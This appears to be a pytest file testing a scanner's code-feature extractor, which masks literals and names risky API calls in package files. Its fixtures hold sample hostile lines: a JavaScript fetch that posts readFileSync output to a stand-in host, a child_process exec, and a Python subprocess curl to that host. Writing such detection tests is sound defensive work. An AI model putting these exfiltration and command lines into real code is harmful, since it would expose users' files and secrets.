"""The code-reading features of the files a consumer runs (`CodeFeatures`), and when they are made."""

from __future__ import annotations

from types import SimpleNamespace

import pytest

from cordon_scanner.detect.base import FileUnit
from cordon_scanner.detect.code.code_features import CodeFeatures
from cordon_scanner.detect.code.reached_flows import ReachedFlows
from cordon_scanner.foundation.content import FileContent

# Distinctive literals: none of them may appear in any feature key, hashed or not.
MARKERS = ("zqxmarkerhost", "zqxmarkerkey", "zqxmarkermod", "zqxmarkercall")
JS = (
    "const cp = require('child_process');\n"
    "const fs = require('fs');\n"
    "const x = require('zqxmarkermod');\n"
    "// a comment with https://zqxmarkerhost.example/path\n"
    "const url = 'https://zqxmarkerhost.example/c';\n"
    "const key = 'zqxmarkerkey';\n"
    "const s = 'zqxmarkercall.exec(';\n"
    "fetch(url, { body: fs.readFileSync(key) });\n"
    "cp.exec(`echo ${key}`);\n"
    "const re = /'/g;\n"
)
PY = (
    "import os  # zqxmarkerhost\n"
    "import subprocess\n"
    "v = os.environ.get('zqxmarkerkey')\n"
    "subprocess.run(['curl', 'https://zqxmarkerhost.example'])\n"
)


class Fixture:
    @staticmethod
    def features(text: str, path: str = "index.js", place: str = "import") -> dict[str, float]:
        return CodeFeatures.of({place: [(path, text.encode())]})


class TestMasking:
    @pytest.mark.parametrize(("text", "path"), [(JS, "index.js"), (PY, "setup.py")])
    def test_no_string_value_appears_in_any_key(self, text: str, path: str) -> None:
        keys = " ".join(Fixture.features(text, path))
        assert not any(marker in keys for marker in MARKERS)

    def test_a_literal_is_its_shape(self) -> None:
        assert CodeFeatures.shape("https://a.example/x") == "URL"
        assert CodeFeatures.shape("QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo" * 2) == "BASE64"
        assert CodeFeatures.shape("deadbeef" * 5) == "HEX"
        assert CodeFeatures.shape("hello") == "STRING"

    def test_a_string_spelling_a_call_is_not_a_call(self) -> None:
        keys = Fixture.features("const s = 'steal.exec(';\n")
        assert not any("_api_exec" in k for k in keys)


class TestCalls:
    def test_listed_modules_and_calls_are_named(self) -> None:
        keys = Fixture.features(JS)
        assert keys.get("code_import_api_mod_child_process") == 1.0
        assert keys.get("code_import_api_mod_fs") == 1.0
        assert keys.get("code_import_api_exec") == 1.0
        assert keys.get("code_import_api_readFileSync") == 1.0

    def test_an_unlisted_module_is_other_by_shape_never_by_name(self) -> None:
        keys = Fixture.features(JS)
        assert keys.get("code_import_api_mod_other") == 1.0

    def test_an_unlisted_member_call_is_hashed(self) -> None:
        keys = Fixture.features("thing.frobnicate();\n")
        assert any(k.startswith("code_import_apih_") for k in keys)
        assert not any("frobnicate" in k for k in keys)

    def test_the_n8n_credential_read_is_named(self) -> None:
        keys = Fixture.features("const c = await this.getCredentials('x');\n")
        assert "code_import_api_this.getCredentials" in keys


class TestBounds:
    def test_the_same_input_gives_the_same_features(self) -> None:
        assert Fixture.features(JS) == Fixture.features(JS)

    def test_text_past_the_place_budget_is_cut_and_said(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(CodeFeatures, "PLACE_BYTES", 64)
        keys = Fixture.features(JS)
        assert keys.get("code_import_truncated") == 1.0

    def test_counts_are_capped(self) -> None:
        keys = Fixture.features("a.exec();\n" * 50)
        assert keys["code_import_api_exec"] == CodeFeatures.COUNT_CAP

    def test_unreadable_python_gives_nothing(self) -> None:
        assert Fixture.features("def (:\n  '''\n", "x.py") == {}

    def test_only_known_places_are_read(self) -> None:
        assert CodeFeatures.of({"other": [("index.js", JS.encode())]}) == {}


class TestWhenMade:
    @staticmethod
    def run() -> dict[str, float]:
        unit = FileUnit(content=FileContent.from_bytes("index.js", JS.encode()))
        ctx = SimpleNamespace(
            install_hook_paths=frozenset(),
            install_entry_paths=frozenset(),
            import_entry_paths=frozenset({"index.js"}),
            library_closure_paths=frozenset(),
        )
        return ReachedFlows.of([unit], ctx)  # type: ignore[arg-type]

    def test_a_users_scan_does_not_make_them(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv(ReachedFlows.MEASURE, raising=False)
        assert not any(k.startswith("code_") for k in TestWhenMade.run())

    def test_a_measurement_run_does(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv(ReachedFlows.MEASURE, "1")
        assert "code_import_api_exec" in TestWhenMade.run()
